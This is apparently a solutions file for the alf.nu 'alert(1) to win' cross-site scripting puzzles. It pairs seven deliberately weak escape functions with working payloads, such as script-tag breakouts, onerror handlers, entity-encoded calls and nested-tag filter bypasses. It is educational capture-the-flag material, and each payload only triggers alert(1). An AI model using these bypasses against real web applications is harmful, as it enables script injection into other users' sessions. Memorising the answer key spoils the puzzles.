# alf.nu

> alert(1) to win
 
## Challenges
- [Warmup](#warmup)
- [Adobe](#adobe)
- [JSON](#json)
- [Markdown](#markdown)
- [DOM](#dom)
- [Skandia](#skandia)
- [JSON2](#json2)

## Warmup

- Task

```
function escape(s) {
  return '<script>console.log("'+s+'");</script>';
}
```

- Solution

```
",alert(1),"
```

## Adobe

- Task

```
function escape(s) {
  s = s.replace(/"/g, '\\"');
  return '<script>console.log("' + s + '");</script>';
}
```

- Solution

```
\");alert(1)//
```

## JSON

- Task

```
function escape(s) {
  s = JSON.stringify(s);
  return '<script>console.log(' + s + ');</script>';
}
```

- Solution

```
</script><script>alert(1)//
```

## Markdown

- Task

```
function escape(s) {
  var text = s.replace(/</g, '&lt;').replace(/"/g, '&quot;');
  // URLs
  text = text.replace(/(http:\/\/\S+)/g, '<a href="$1">$1</a>');
  // [[img123|Description]]
  text = text.replace(/\[\[(\w+)\|(.+?)\]\]/g, '<img alt="$2" src="$1.gif">');
  return text;
}
```

- Solution

```
[[x|http://onerror=javascript:alert(1)//]]
```

## DOM

- Task

```
function escape(s) {
  // Slightly too lazy to make two input fields.
  // Pass in something like "TextNode#foo"
  var m = s.split(/#/);

  // Only slightly contrived at this point.
  var a = document.createElement('div');
  a.appendChild(document['create'+m[0]].apply(document, m.slice(1)));
  return a.innerHTML;
}
```

- Solution

```
Comment#--><img src onerror=alert(1) /><!--
```

- HTML source

```
<!----><img src onerror=alert(1) /><!---->
```

## Skandia

- Task

```
function escape(s) {
  return '<script>console.log("' + s.toUpperCase() + '")</script>';
}
```

- Solution

```
</script><img src onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;(1)>
```

## JSON2

- Task

```
function escape(s) {
  s = JSON.stringify(s).replace(/<\/script/gi, '');

  return '<script>console.log(' + s + ');</script>';
}
```

- Solution

```
</scrip</scriptt><script>alert(1)//
```
